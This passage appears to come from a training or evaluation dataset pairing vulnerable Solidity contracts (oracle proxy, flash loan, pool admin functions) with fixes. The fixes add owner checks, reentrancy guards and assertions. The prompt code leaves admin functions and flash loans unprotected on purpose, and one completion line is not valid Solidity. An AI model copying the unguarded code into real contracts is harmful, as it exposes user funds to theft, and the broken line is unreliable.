Yvault tokens\");\n380         require(tokenAddresses.length == version.length, \"mismatched data\");\n381         for (uint256 i = 0; i < tokenAddresses.length; i++) {\n382             // Sanity check to make sure version is right.\n383             if (version[i] == YvTokenVersion.V1) {\n384                 YVaultV1Interface(tokenAddresses[i]).getPricePerFullShare();\n385             } else {\n386                 YVaultV2Interface(tokenAddresses[i]).pricePerShare();\n387             }\n388 \n389             yvTokens[tokenAddresses[i]] = YvTokenInfo({isYvToken: true, version: version[i]});\n390             emit SetYVaultToken(tokenAddresses[i], version[i]);\n391         }\n392     }\n393 \n394     /**\n395      * @notice See assets as curve pool tokens for multiple tokens\n396      * @param tokenAddresses The list of tokens\n397      * @param poolType The list of curve pool type (ETH or USD base only)\n398      * @param swap The list of curve swap address\n399      */\n400     function _setCurveTokens(\n401         address[] calldata tokenAddresses,\n402         CurveTokenVersion[] calldata version,\n403         CurvePoolType[] calldata poolType,\n404         address[] calldata swap\n405     ) external {\n406         require(msg.sender == admin, \"only the admin may set curve pool tokens\");\n407         require(\n408             tokenAddresses.length == version.length &&\n409                 tokenAddresses.length == poolType.length &&\n410                 tokenAddresses.length == swap.length,\n411             \"mismatched data\"\n412         );\n413         for (uint256 i = 0; i < tokenAddresses.length; i++) {\n414             if (version[i] == CurveTokenVersion.V3) {\n415                 // Sanity check to make sure the token minter is right.\n416                 require(CurveTokenV3Interface(tokenAddresses[i]).minter() == swap[i], \"incorrect pool\");\n417             }\n418 \n419             crvTokens[tokenAddresses[i]] = CrvTokenInfo({isCrvToken: true, poolType: poolType[i], curveSwap: swap[i]});\n420             emit SetCurveToken(tokenAddresses[i], poolType[i], swap[i]);\n421         }\n422     }\n423 \n424     /**\n425      * @notice Set guardian for price oracle proxy\n426      * @param _guardian The new guardian\n427      */\n428     function _setGuardian(address _guardian) external {\n429         require(msg.sender == admin, \"only the admin may set new guardian\");\n430         guardian = _guardian;\n431         emit SetGuardian(guardian);\n432     }\n433 \n434     /**\n435      * @notice Set admin for price oracle proxy\n436      * @param _admin The new admin\n437      */\n438     function _setAdmin(address _admin) external {\n439         require(msg.sender == admin, \"only the admin may set new admin\");\n440         admin = _admin;\n441         emit SetAdmin(admin);\n442     }\n443 }",
        "completion": "226 require(yvTokenInfo.isYvToken, \"not a Yvault token\");\n231+ assert(pricePerShare <= k*Old(pricePerShare));\n254 require(crvTokenInfo.isCrvToken, \"not a curve pool token\");\n322 require(msg.sender == admin || msg.sender == guardian, \"only the admin or guardian may set the aggregators\");\n323 require(tokenAddresses.length == quotes.length, \"mismatched data\");\n329 require(msg.sender == admin, \"guardian may only clear the aggregator\");\n360 require(msg.sender == admin, \"only the admin may set LPs\");\n361 require(tokenAddresses.length == isLP.length, \"mismatched data\");\n379 require(msg.sender == admin, \"only the admin may set Yvault tokens\");\n380 require(tokenAddresses.length == version.length, \"mismatched data\");\n406 require(msg.sender == admin, \"only the admin may set curve pool tokens\");\n407  require(\n               tokenAddresses.length == version.length &&                         tokenAddresses.length == poolType.length && tokenAddresses.length == swap.length, \"mismatched data\"         );\n416 require(CurveTokenV3Interface(tokenAddresses[i]).minter() == swap[i], \"incorrect pool\");\n429 require(msg.sender == admin, \"only the admin may set new guardian\");\n439 require(msg.sender == admin, \"only the admin may set new admin\");"
    },
    {
        "prompt": "1 contract Example {\n2     function flash(\n3         address recipient,\n4         uint256 amount0,\n5         uint256 amount1,\n6         bytes calldata data\n7     ) external isFlashable globallyTransactable transactable isNotEmergency {\n8         uint256 fee = curve.epsilon.mulu(1e18);\n9         \n10         uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e18);\n11         uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e18);\n12 \n13         uint256 balance0Before = IERC20(derivatives[0]).balanceOf(address(this));\n14         uint256 balance1Before = IERC20(derivatives[1]).balanceOf(address(this));\n15 \n16         if (amount0 > 0) IERC20(derivatives[0]).safeTransfer(recipient, amount0);\n17         if (amount1 > 0) IERC20(derivatives[1]).safeTransfer(recipient, amount1);\n18 \n19         IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);\n20 \n21         uint256 balance0After = IERC20(derivatives[0]).balanceOf(address(this));\n22         uint256 balance1After = IERC20(derivatives[1]).balanceOf(address(this));\n23 \n24         // sub is safe because we know balanceAfter is gt balanceBefore by at least fee\n25         uint256 paid0 = balance0After - balance0Before;\n26         uint256 paid1 = balance1After - balance1Before;\n27 \n28         IERC20(derivatives[0]).safeTransfer(owner, paid0);        \n29         IERC20(derivatives[1]).safeTransfer(owner, paid1);        \n30 \n31         emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);\n32     }  \n33 }  ",
        "completion": "1+  modifier nonReentrant() {\n        require(notEntered, \"Curve/re-entered\");\n        notEntered = false;\n        _;\n        notEntered = true;\n    }\n7 nonReentrant \n8+ assert(IERC20(derivatives[0]).balanceOf(address(this)) > 0);\n9+ assert(IERC20(derivatives[1]).balanceOf(address(this)) > 0);\n22+ assert(balance0Before.add(fee0) <= balance0After);\n23+ assert(balance1Before.add(fee1) <= balance1After);"
    },
    {
        "prompt": "1  contract PoolCurve{\n2 \n3    /// @notice sets the parameters for the pool\n4     /// @param _alpha the value for alpha (halt threshold) must be less than or equal to 1 and greater than 0\n5     /// @param _beta the value for beta must be less than alpha and greater than 0\n6     /// @param _feeAtHalt the maximum value for the fee at the halt point\n7     /// @param _epsilon the base fee for the pool\n8     /// @param _lambda the value for lambda must be less than or equal to 1 and greater than zero\n9     function setParams(\n10         uint256 _alpha,\n11         uint256 _beta,\n12         uint256 _feeAtHalt,\n13         uint256 _epsilon,\n14         uint256 _lambda\n15     ) external {\n16         Orchestrator.setParams(curve, _alpha, _beta, _feeAtHalt, _epsilon, _lambda);\n17     }\n18 \n19     /// @notice excludes an assimilator from the curve\n20     /// @param _derivative the address of the assimilator to exclude\n21     function excludeDerivative(address _derivative) external {\n22         for (uint256 i = 0; i < numeraires.length; i++) {\n23             if (_derivative == numeraires[i]) revert(\"Curve/cannot-delete-numeraire\");\n24             if (_derivative == reserves[i]) revert(\"Curve/cannot-delete-reserve\");\n25         }\n26 \n27         delete curve.assimilators[_derivative];\n28     }\n29 \n30     function turnOffWhitelisting() external {\n31         emit WhitelistingStopped();\n32 \n33         whitelistingStage = false;\n34     }\n35 \n36     function setEmergency(bool _emergency) external {\n37         emit EmergencyAlarm(_emergency);\n38 \n39         emergency = _emergency;\n40     }\n41 \n42     function setFrozen(bool _toFreezeOrNotToFreeze) external {\n43         emit FrozenSet(_toFreezeOrNotToFreeze);\n44 \n45         frozen = _toFreezeOrNotToFreeze;\n46     }\n47 \n48     function transferOwnership(address _newOwner) external {\n49         require(_newOwner != address(0), \"Curve/new-owner-cannot-be-zeroth-address\");\n50 \n51         emit OwnershipTransfered(owner, _newOwner);\n52 \n53         owner = _newOwner;\n54     }\n55 \n56 }",
        "completion": "1+ modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n9 onlyOwner\n21 onlyOwner\n30 onlyOwner\n36 onlyOwner\n42 onlyOwner\n48 onlyOwner"
    },
    {
        "prompt": "1  pragma solidity ^0.8.13;\n2 pragma experimental ABIEncoderV2;\n3 \n4 import './interfaces/IFlashCallback.sol';\n5 \n6 import \"../lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol\";\n7 \n8 import \"./lib/ABDKMath64x64.sol\";\n9 \n10 import \"./lib/FullMath.sol\";\n11 \n12 import \"./lib/NoDelegateCall.sol\";\n13 \n14 import \"./Orchestrator.sol\";\n15 \n16 import \"./ProportionalLiquidity.sol\";\n17 \n18 import \"./Swaps.sol\";\n19 \n20 import \"./ViewLiquidity.sol\";\n21 \n22 import \"./Storage.sol\";\n23 \n24 import \"./MerkleProver.sol\";\n25 \n26 import \"./interfaces/IFreeFromUpTo.sol\";\n27 \n28 import \"./interfaces/ICurveFactory.sol\";\n29 \n30 import \"./Structs.sol\";\n31 \n32 library Curves {\n33     using ABDKMath64x64 for int128;\n34 \n35     event Approval(address indexed _owner, address indexed spender, uint256 value);\n36     event Transfer(address indexed from, address indexed to, uint256 value);\n37 \n38     function add(\n39         uint256 x,\n40         uint256 y,\n41         string memory errorMessage\n42     ) private pure returns (uint256 z) {\n43         require((z = x + y) >= x, errorMessage);\n44     }\n45 \n46     function sub(\n47         uint256 x,\n48         uint256 y,\n49         string memory errorMessage\n50     ) private pure returns (uint256 z) {\n51         require((z = x - y) <= x, errorMessage);\n52     }\n53 \n54     /**\n55      * @dev See {IERC20-transfer}.\n56      *\n57      * Requirements:\n58      *\n59      * - `recipient` cannot be the zero address.\n60      * - the caller must have a balance of at least `amount`.\n61      */\n62     function transfer(\n63         Storage.Curve storage curve,\n64         address recipient,\n65         uint256 amount\n66     ) external returns (bool) {\n67         _transfer(curve, msg.sender, recipient, amount);\n68         return true;\n69     }\n70 \n71     /**\n72      * @dev See {IERC20-approve}.\n73      *\n74      * Requirements:\n75      *\n76      * - `spender` cannot be the zero address.\n77      */\n78     function approve(\n79         Storage.Curve storage curve,\n80         address spender,\n81         uint256 amount\n82     ) external returns (bool) {\n83         _approve(curve, msg.sender, spender, amount);\n84         return true;\n85     }\n86 \n87     /**\n88      * @dev See {IERC20-transferFrom}.\n89      *\n90      * Emits an {Approval} event indicating the updated allowance. This is not\n91      * required by the EIP. See the note at the beginning of {ERC20};\n92      *\n93      * Requirements:\n94      * - `sender` and `recipient` cannot be the zero address.\n95      * - `sender` must have a balance of at least `amount`.\n96      * - the caller must have allowance for `sender`'s tokens of at least\n97      * `amount`\n98      */\n99     function transferFrom(\n100         Storage.Curve storage curve,\n101         address sender,\n102         address recipient,\n103         uint256 amount\n104     ) external returns (bool) {\n105         _transfer(curve, sender, recipient, amount);\n106         _approve(\n107             curve,\n108             sender,\n109             msg.sender,\n110             sub(curve.allowances[sender][msg.sender], amount, \"Curve/insufficient-allowance\")\n111         );\n112         return true;\n113     }\n114 \n115     /**\n116      * @dev Atomically increases the allowance granted to `spender` by the caller.\n117      *\n118      * This is an alternative to {approve} that can be used as a mitigation for\n119      * problems described in {IERC20-approve}.\n120      *\n121      * Emits an {Approval} event indicating the updated allowance.\n122      *\n123      * Requirements:\n124      *\n125      * - `spender` cannot be the zero address.\n126      */\n127     function increaseAllowance(\n128         Storage.Curve storage curve,\n129         address spender,\n130         uint256 addedValue\n131     ) external returns (bool) {\n132         _approve(\n133             curve,\n134             msg.sender,\n135             spender,\n136             add(curve.allowances[msg.sender][spender], addedValue, \"Curve/approval-overflow\")\n137         );\n138         return true;\n139     }\n140 \n141     /**\n142      * @dev Atomically decreases the allowance granted to `spender` by the caller.\n143      *\n144      * This is an alternative to {approve} that can be used as a mitigation for\n145      * problems described in {IERC20-approve}.\n146      *\n147      * Emits an {Approval} event indicating the updated allowance.\n148      *\n149      * Requirements:\n150      *\n151      * - `spender` cannot be the zero address.\n152      * - `spender` must have allowance for the caller of at least\n153      * `subtractedValue`.\n154      */\n155     function decreaseAllowance(\n156         Storage.Curve storage curve,\n157         address spender,\n158         uint256 subtractedValue\n159     ) external returns (bool) {\n160         _approve(\n161             curve,\n162             msg.sender,\n163             spender,\n164             sub(curve.allowances[msg.sender][spender], subtractedValue, \"Curve/allowance-decrease-underflow\")\n165         );\n166         return true;\n167     }\n168 \n169     /**\n170      * @dev Moves tokens `amount` from `sender` to `recipient`.\n171      *\n172      * This is public function is equivalent to {transfer}, and can be used to\n173      * e.g. implement automatic token fees, slashing mechanisms, etc.\n174      *\n175      * Emits a {Transfer} event.\n176      *\n177      * Requirements:\n178      *\n179      * - `sender` cannot be the zero address.\n180      * - `recipient` cannot be the zero address.\n181      * - `sender` must have a balance of at least `amount`.\n182      */\n183     function _transfer(\n184         Storage.Curve storage curve,\n185         address sender,\n186         address recipient,\n187         uint256 amount\n188     ) private {\n189         require(sender != address(0), \"ERC20: transfer from the zero address\");\n190         require(recipient != address(0), \"ERC20: transfer to the zero address\");\n191 \n192         curve.balances[sender] = sub(curve.balances[sender], amount, \"Curve/insufficient-balance\");\n193         curve.balances[recipient] = add(curve.balances[recipient], amount, \"Curve/transfer-overflow\");\n194         emit Transfer(sender, recipient, amount);\n195     }\n196 \n197     /**\n198      * @dev Sets `amount` as the allowance of `spender` over the `_owner`s tokens.\n199      *\n200      * This is public function is equivalent to `approve`, and can be used to\n201      * e.g. set automatic allowances for certain subsystems, etc.\n202      *\n203      * Emits an {Approval} event.\n204      *\n205      * Requirements:\n206      *\n207      * - `_owner` cannot be the zero address.\n208      * - `spender` cannot be the zero address.\n209      */\n210     function _approve(\n211         Storage.Curve storage curve,\n212         address _owner,\n213         address spender,\n214         uint256 amount\n215     ) private {\n216         require(_owner != address(0), \"ERC20: approve from the zero address\");\n217         require(spender != address(0), \"ERC20: approve to the zero address\");\n218 \n219         curve.allowances[_owner][spender] = amount;\n220         emit Approval(_owner, spender, amount);\n221     }\n222 }\n223 \n224 contract Curve is Storage, MerkleProver, NoDelegateCall {\n225     using SafeMath for uint256;\n226     using ABDKMath64x64 for int128;\n227     using SafeERC20 for IERC20;\n228 \n229     address private curveFactory;\n230 \n231     event Approval(address indexed _owner, address indexed spender, uint256 value);\n232 \n233     event ParametersSet(uint256 alpha, uint256 beta, uint256 delta, uint256 epsilon, uint256 lambda);\n234 \n235     event AssetIncluded(address indexed numeraire, address indexed reserve, uint256 weight);\n236 \n237     event AssimilatorIncluded(\n238         address indexed derivative,\n239         address indexed numeraire,\n240         address indexed reserve,\n241         address assimilator\n242     );\n243 \n244     event PartitionRedeemed(address indexed token, address indexed redeemer, uint256 value);\n245 \n246     event OwnershipTransfered(address indexed previousOwner, address indexed newOwner);\n247 \n248     event FrozenSet(bool isFrozen);\n249 \n250     event EmergencyAlarm(bool isEmergency);\n251 \n252     event WhitelistingStopped();\n253 \n254     event Trade(\n255         address indexed trader,\n256         address indexed origin,\n257         address indexed target,\n258         uint256 originAmount,\n259         uint256 targetAmount\n260     );\n261 \n262     event Transfer(address indexed from, address indexed to, uint256 value);\n263 \n264     event Flash(address indexed from, address indexed to, uint256 value0, uint256 value1, uint256 paid0, uint256 paid1);\n265 \n266     modifier onlyOwner() {\n267         require(msg.sender == owner, \"Curve/caller-is-not-owner\");\n268         _;\n269     }\n270 \n271     modifier nonReentrant() {\n272         require(notEntered, \"Curve/re-entered\");\n273         notEntered = false;\n274         _;\n275         notEntered = true;\n276     }\n277 \n278     modifier transactable() {\n279         require(!frozen, \"Curve/frozen-only-allowing-proportional-withdraw\");\n280         _;\n281     }\n282 \n283     modifier isEmergency() {\n284         require(emergency, \"Curve/emergency-only-allowing-emergency-proportional-withdraw\");\n285         _;\n286     }\n287 \n288     modifier isNotEmergency() {\n289         require(!emergency, \"Curve/emergency-only-allowing-emergency-proportional-withdraw\");\n290         _;\n291     }\n292 \n293     modifier deadline(uint256 _deadline) {\n294         require(block.timestamp < _deadline, \"Curve/tx-deadline-passed\");\n295         _;\n296     }\n297 \n298     modifier inWhitelistingStage() {\n299         require(whitelistingStage, \"Curve/whitelist-stage-stopped\");\n300         _;\n301     }\n302 \n303     modifier notInWhitelistingStage() {\n304         require(!whitelistingStage, \"Curve/whitelist-stage-on-going\");\n305         _;\n306     }\n307 \n308     modifier globallyTransactable() {\n309         require(!ICurveFactory(address(curveFactory)).getGlobalFrozenState(), \"Curve/frozen-globally-only-allowing-proportional-withdraw\");\n310         _;\n311     }\n312     \n313     modifier isFlashable() {\n314         require(ICurveFactory(address(curveFactory)).getFlashableState(), \"Curve/flashloans-paused\");\n315         _;\n316     }\n317 \n318     constructor(\n319         string memory _name,\n320         string memory _symbol,\n321         address[] memory _assets,\n322         uint256[] memory _assetWeights,\n323         address _factory\n324     ) {\n325         owner = msg.sender;\n326         name = _name;\n327         symbol = _symbol;\n328         curveFactory = _factory;\n329         emit OwnershipTransfered(address(0), msg.sender);\n330 \n331         Orchestrator.initialize(curve, numeraires, reserves, derivatives, _assets, _assetWeights);\n332     }\n333 \n334     /// @notice sets the parameters for the pool\n335     /// @param _alpha the value for alpha (halt threshold) must be less than or equal to 1 and greater than 0\n336     /// @param _beta the value for beta must be less than alpha and greater than 0\n337     /// @param _feeAtHalt the maximum value for the fee at the halt point\n338     /// @param _epsilon the base fee for the pool\n339     /// @param _lambda the value for lambda must be less than or equal to 1 and greater than zero\n340     function setParams(\n341         uint256 _alpha,\n342         uint256 _beta,\n343         uint256 _feeAtHalt,\n344         uint256 _epsilon,\n345         uint256 _lambda\n346     ) external onlyOwner {\n347         Orchestrator.setParams(curve, _alpha, _beta, _feeAtHalt, _epsilon, _lambda);\n348     }\n349 \n350     /// @notice excludes an assimilator from the curve\n351     /// @param _derivative the address of the assimilator to exclude\n352     function excludeDerivative(address _derivative) external onlyOwner {\n353         for (uint256 i = 0; i < numeraires.length; i++) {\n354             if (_derivative == numeraires[i]) revert(\"Curve/cannot-delete-numeraire\");\n355             if (_derivative == reserves[i]) revert(\"Curve/cannot-delete-reserve\");\n356         }\n357 \n358         delete curve.assimilators[_derivative];\n359     }\n360 \n361     /// @notice view the current parameters of the curve\n362     /// @return alpha_ the current alpha value\n363     ///  beta_ the current beta value\n364     ///  delta_ the current delta value\n365     ///  epsilon_ the current epsilon value\n366     ///  lambda_ the current lambda value\n367     ///  omega_ the current omega value\n368     function viewCurve()\n369         external\n370         view\n371         returns (\n372             uint256 alpha_,\n373             uint256 beta_,\n374             uint256 delta_,\n375             uint256 epsilon_,\n376             uint256 lambda_\n377         )\n378     {\n379         return Orchestrator.viewCurve(curve);\n380     }\n381 \n382     function turnOffWhitelisting() external onlyOwner {\n383         emit WhitelistingStopped();\n384 \n385         whitelistingStage = false;\n386     }\n387 \n388     function setEmergency(bool _emergency) external onlyOwner {\n389         emit EmergencyAlarm(_emergency);\n390 \n391         emergency = _emergency;\n392     }\n393 \n394     function setFrozen(bool _toFreezeOrNotToFreeze) external onlyOwner {\n395         emit FrozenSet(_toFreezeOrNotToFreeze);\n396 \n397         frozen = _toFreezeOrNotToFreeze;\n398     }\n399 \n400     function transferOwnership(address _newOwner) external onlyOwner {\n401         require(_newOwner != address(0), \"Curve/new-owner-cannot-be-zeroth-address\");\n402 \n403         emit OwnershipTransfered(owner, _newOwner);\n404 \n405         owner = _newOwner;\n406     }\n407 \n408     /// @notice swap a dynamic origin amount for a fixed target amount\n409     /// @param _origin the address of the origin\n410     /// @param _target the address of the target\n411     /// @param _originAmount the origin amount\n412     /// @param _minTargetAmount the minimum target amount\n413     /// @param _deadline deadline in block number after which the trade will not execute\n414     /// @return targetAmount_ the amount of target that has been swapped for the origin amount\n415     function originSwap(\n416         address _origin,\n417         address _target,\n418         uint256 _originAmount,\n419         uint256 _minTargetAmount,\n420         uint256 _deadline\n421     ) external deadline(_deadline) globallyTransactable transactable noDelegateCall isNotEmergency nonReentrant returns (uint256 targetAmount_) {\n422         OriginSwapData memory _swapData;\n423         _swapData._origin = _origin;\n424         _swapData._target = _target;\n425         _swapData._originAmount = _originAmount;\n426         _swapData._recipient = msg.sender;\n427         _swapData._curveFactory = curveFactory;\n428         targetAmount_ = Swaps.originSwap(curve, _swapData);\n429         // targetAmount_ = Swaps.originSwap(curve, _origin, _target, _originAmount, msg.sender,curveFactory);\n430 \n431         require(targetAmount_ >= _minTargetAmount, \"Curve/below-min-target-amount\");\n432     }\n433 \n434     /// @notice view how much target amount a fixed origin amount will swap for\n435     /// @param _origin the address of the origin\n436     /// @param _target the address of the target\n437     /// @param _originAmount the origin amount\n438     /// @return targetAmount_ the target amount that would have been swapped for the origin amount\n439     function viewOriginSwap(\n440         address _origin,\n441         address _target,\n442         uint256 _originAmount\n443     ) external view globallyTransactable transactable returns (uint256 targetAmount_) {\n444         targetAmount_ = Swaps.viewOriginSwap(curve, _origin, _target, _originAmount);\n445     }\n446 \n447     /// @notice swap a dynamic origin amount for a fixed target amount\n448     /// @param _origin the address of the origin\n449     /// @param _target the address of the target\n450     /// @param _maxOriginAmount the maximum origin amount\n451     /// @param _targetAmount the target amount\n452     /// @param _deadline deadline in block number after which the trade will not execute\n453     /// @return originAmount_ the amount of origin that has been swapped for the target\n454     function targetSwap(\n455         address _origin,\n456         address _target,\n457         uint256 _maxOriginAmount,\n458         uint256 _targetAmount,\n459         uint256 _deadline\n460     ) external deadline(_deadline) globallyTransactable transactable noDelegateCall isNotEmergency nonReentrant returns (uint256 originAmount_) {\n461         TargetSwapData memory _swapData;\n462         _swapData._origin = _origin;\n463         _swapData._target = _target;\n464         _swapData._targetAmount = _targetAmount;\n465         _swapData._recipient = msg.sender;\n466         _swapData._curveFactory = curveFactory;\n467         originAmount_ = Swaps.targetSwap(curve, _swapData);\n468         // originAmount_ = Swaps.targetSwap(curve, _origin, _target, _targetAmount, msg.sender,curveFactory);\n469 \n470         require(originAmount_ <= _maxOriginAmount, \"Curve/above-max-origin-amount\");\n471     }\n472 \n473     /// @notice view how much of the origin currency the target currency will take\n474     /// @param _origin the address of the origin\n475     /// @param _target the address of the target\n476     /// @param _targetAmount the target amount\n477     /// @return originAmount_ the amount of target that has been swapped for the origin\n478     function viewTargetSwap(\n479         address _origin,\n480         address _target,\n481         uint256 _targetAmount\n482     ) external view globallyTransactable transactable returns (uint256 originAmount_) {\n483         originAmount_ = Swaps.viewTargetSwap(curve, _origin, _target, _targetAmount);\n484     }\n485 \n486     /// @notice deposit into the pool with no slippage from the numeraire assets the pool supports\n487     /// @param  index Index corresponding to the merkleProof\n488     /// @param  account Address coorresponding to the merkleProof\n489     /// @param  amount Amount coorresponding to the merkleProof, should always be 1\n490     /// @param  merkleProof Merkle proof\n491     /// @param  _deposit the full amount you want to deposit into the pool which will be divided up evenly amongst\n492     ///                  the numeraire assets of the pool\n493     /// @return (the amount of curves you receive in return for your deposit,\n494     ///          the amount deposited for each numeraire)\n495     function depositWithWhitelist(\n496         uint256 index,\n497         address account,\n498         uint256 amount,\n499         bytes32[] calldata merkleProof,\n500         uint256 _deposit,\n501         uint256 _deadline\n502     ) external deadline(_deadline) globallyTransactable transactable nonReentrant noDelegateCall inWhitelistingStage returns (uint256, uint256[] memory) {\n503         require(amount == 1, \"Curve/invalid-amount\");\n504         require(index <= 473, \"Curve/index-out-of-range\" );\n505         require(isWhitelisted(index, account, amount, merkleProof), \"Curve/not-whitelisted\");\n506         require(msg.sender == account, \"Curve/not-approved-user\");\n507 \n508         (uint256 curvesMinted_, uint256[] memory deposits_) =\n509             ProportionalLiquidity.proportionalDeposit(curve, _deposit);\n510 \n511         whitelistedDeposited[msg.sender] = whitelistedDeposited[msg.sender].add(curvesMinted_);\n512 \n513         // 10k max deposit\n514         if (whitelistedDeposited[msg.sender] > 10000e18) {\n515             revert(\"Curve/exceed-whitelist-maximum-deposit\");\n516         }\n517 \n518         return (curvesMinted_, deposits_);\n519     }\n520 \n521     /// @notice deposit into the pool with no slippage from the numeraire assets the pool supports\n522     /// @param  _deposit the full amount you want to deposit into the pool which will be divided up evenly amongst\n523     ///                  the numeraire assets of the pool\n524     /// @return (the amount of curves you receive in return for your deposit,\n525     ///          the amount deposited for each numeraire)\n526     function deposit(uint256 _deposit, uint256 _deadline)\n527         external\n528         deadline(_deadline)\n529         globallyTransactable\n530         transactable\n531         nonReentrant\n532         noDelegateCall\n533         notInWhitelistingStage\n534         isNotEmergency\n535         returns (uint256, uint256[] memory)\n536     {\n537         // (curvesMinted_,  deposits_)\n538         return ProportionalLiquidity.proportionalDeposit(curve, _deposit);\n539     }\n540 \n541     /// @notice view deposits and curves minted a given deposit would return\n542     /// @param _deposit the full amount of stablecoins you want to deposit. Divided evenly according to the\n543     ///                 prevailing proportions of the numeraire assets of the pool\n544     /// @return (the amount of curves you receive in return for your deposit,\n545     ///          the amount deposited for each numeraire)\n546     function viewDeposit(uint256 _deposit) external view globallyTransactable transactable returns (uint256, uint256[] memory) {\n547         // curvesToMint_, depositsToMake_\n548         return ProportionalLiquidity.viewProportionalDeposit(curve, _deposit);\n549     }\n550 \n551     /// @notice  Emergency withdraw tokens in the event that the oracle somehow bugs out\n552     ///          and no one is able to withdraw due to the invariant check\n553     /// @param   _curvesToBurn the full amount you want to withdraw from the pool which will be withdrawn from evenly amongst the\n554     ///                        numeraire assets of the pool\n555     /// @return withdrawals_ the amonts of numeraire assets withdrawn from the pool\n556     function emergencyWithdraw(uint256 _curvesToBurn, uint256 _deadline)\n557         external\n558         isEmergency\n559         deadline(_deadline)\n560         nonReentrant\n561         noDelegateCall\n562         returns (uint256[] memory withdrawals_)\n563     {\n564         return ProportionalLiquidity.proportionalWithdraw(curve, _curvesToBurn);\n565     }\n566 \n567     /// @notice  withdrawas amount of curve tokens from the the pool equally from the numeraire assets of the pool with no slippage\n568     /// @param   _curvesToBurn the full amount you want to withdraw from the pool which will be withdrawn from evenly amongst the\n569     ///                        numeraire assets of the pool\n570     /// @return withdrawals_ the amonts of numeraire assets withdrawn from the pool\n571     function withdraw(uint256 _curvesToBurn, uint256 _deadline)\n572         external\n573         deadline(_deadline)\n574         nonReentrant\n575         noDelegateCall\n576         isNotEmergency\n577         returns (uint256[] memory withdrawals_)\n578     {\n579         if (whitelistingStage) {\n580             whitelistedDeposited[msg.sender] = whitelistedDeposited[msg.sender].sub(_curvesToBurn);\n581         }\n582 \n583         return ProportionalLiquidity.proportionalWithdraw(curve, _curvesToBurn);\n584     }\n585 \n586     /// @notice  views the withdrawal information from the pool\n587     /// @param   _curvesToBurn the full amount you want to withdraw from the pool which will be withdrawn from evenly amongst the\n588     ///                        numeraire assets of the pool\n589     /// @return the amonnts of numeraire assets withdrawn from the pool\n590     function viewWithdraw(uint256 _curvesToBurn) external view globallyTransactable transactable returns (uint256[] memory) {\n591         return ProportionalLiquidity.viewProportionalWithdraw(curve, _curvesToBurn);\n592     }\n593 \n594     function supportsInterface(bytes4 _interface) public pure returns (bool supports_) {\n595         supports_ =\n596             this.supportsInterface.selector == _interface || // erc165\n597             bytes4(0x7f5828d0) == _interface || // eip173\n598             bytes4(0x36372b07) == _interface; // erc20\n599     }\n600 \n601     /// @notice transfers curve tokens\n602     /// @param _recipient the address of where to send the curve tokens\n603     /// @param _amount the amount of curve tokens to send\n604     /// @return success_ the success bool of the call\n605     function transfer(address _recipient, uint256 _amount) public nonReentrant noDelegateCall isNotEmergency returns (bool success_) {\n606         success_ = Curves.transfer(curve, _recipient, _amount);\n607     }\n608 \n609     /// @notice transfers curve tokens from one address to another address\n610     /// @param _sender the account from which the curve tokens will be sent\n611     /// @param _recipient the account to which the curve tokens will be sent\n612     /// @param _amount the amount of curve tokens to transfer\n613     /// @return success_ the success bool of the call\n614     function transferFrom(\n615         address _sender,\n616         address _recipient,\n617         uint256 _amount\n618     ) public nonReentrant noDelegateCall isNotEmergency returns (bool success_) {\n619         success_ = Curves.transferFrom(curve, _sender, _recipient, _amount);\n620     }\n621 \n622     /// @notice approves a user to spend curve tokens on their behalf\n623     /// @param _spender the account to allow to spend from msg.sender\n624     /// @param _amount the amount to specify the spender can spend\n625     /// @return success_ the success bool of this call\n626     function approve(address _spender, uint256 _amount) public nonReentrant noDelegateCall returns (bool success_) {\n627         success_ = Curves.approve(curve, _spender, _amount);\n628     }\n629     \n630     function flash(\n631         address recipient,\n632         uint256 amount0,\n633         uint256 amount1,\n634         bytes calldata data\n635     ) external isFlashable globallyTransactable nonReentrant noDelegateCall transactable isNotEmergency {\n636         uint256 fee = curve.epsilon.mulu(1e18);\n637 \n638         require(IERC20(derivatives[0]).balanceOf(address(this)) > 0, 'Curve/token0-zero-liquidity-depth');\n639         require(IERC20(derivatives[1]).balanceOf(address(this)) > 0, 'Curve/token1-zero-liquidity-depth');\n640         \n641         uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e18);\n642         uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e18);\n643 \n644         uint256 balance0Before = IERC20(derivatives[0]).balanceOf(address(this));\n645         uint256 balance1Before = IERC20(derivatives[1]).balanceOf(address(this));\n646 \n647         if (amount0 > 0) IERC20(derivatives[0]).safeTransfer(recipient, amount0);\n648         if (amount1 > 0) IERC20(derivatives[1]).safeTransfer(recipient, amount1);\n649 \n650         IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);\n651 \n652         uint256 balance0After = IERC20(derivatives[0]).balanceOf(address(this));\n653         uint256 balance1After = IERC20(derivatives[1]).balanceOf(address(this));\n654 \n655         require(balance0Before.add(fee0) <= balance0After, 'Curve/insufficient-token0-returned');\n656         require(balance1Before.add(fee1) <= balance1After, 'Curve/insufficient-token1-returned');\n657 \n658         // sub is safe because we know balanceAfter is gt balanceBefore by at least fee\n659         uint256 paid0 = balance0After - balance0Before;\n660         uint256 paid1 = balance1After - balance1Before;\n661 \n662         IERC20(derivatives[0]).safeTransfer(owner, paid0);        \n663         IERC20(derivatives[1]).safeTransfer(owner, paid1);        \n664 \n665         emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);\n666     }    \n667 \n668     /// @notice view the curve token balance of a given account\n669     /// @param _account the account to view the balance of\n670     /// @return balance_ the curve token ballance of the given account\n671     function balanceOf(address _account) public view returns (uint256 balance_) {\n672         balance_ = curve.balances[_account];\n673     }\n674 \n675     /// @notice views the total curve supply of the pool\n676     /// @return totalSupply_ the total supply of curve tokens\n677     function totalSupply() public view returns (uint256 totalSupply_) {\n678         totalSupply_ = curve.totalSupply;\n679     }\n680 \n681     /// @notice views the total allowance one address has to spend from another address\n682     /// @param _owner the address of the owner\n683     /// @param _spender the address of the spender\n684     /// @return allowance_ the amount the owner has allotted the spender\n685     function allowance(address _owner, address _spender) public view returns (uint256 allowance_) {\n686         allowance_ = curve.allowances[_owner][_spender];\n687     }\n688 \n689     /// @notice views the total amount of liquidity in the curve in numeraire value and format - 18 decimals\n690     /// @return total_ the total value in the 